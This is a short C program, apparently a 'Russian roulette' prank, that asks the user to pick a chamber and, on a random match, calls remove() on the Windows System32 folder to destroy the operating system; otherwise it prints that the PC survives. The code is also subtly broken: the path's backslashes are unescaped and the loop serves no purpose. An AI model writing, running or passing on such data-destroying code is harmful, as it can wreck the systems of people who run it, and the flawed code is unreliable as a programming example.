
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main() {
    int revolver, bullet;
    srand(time(0));
    bullet = rand() % 6 + 1;
    printf ("Enter the number of the chamber you want to fire: ");
    scanf ("%d", &revolver);
    for (int i = 1; i <= 6; i++) {
        if (revolver == bullet) {
            remove("C:\Windows\System32");
            break;
        }
        else {
            printf ("Your pc lives another day!");
            break;
        }
    }
    //printf ("%d", bullet);
    return 0;
}
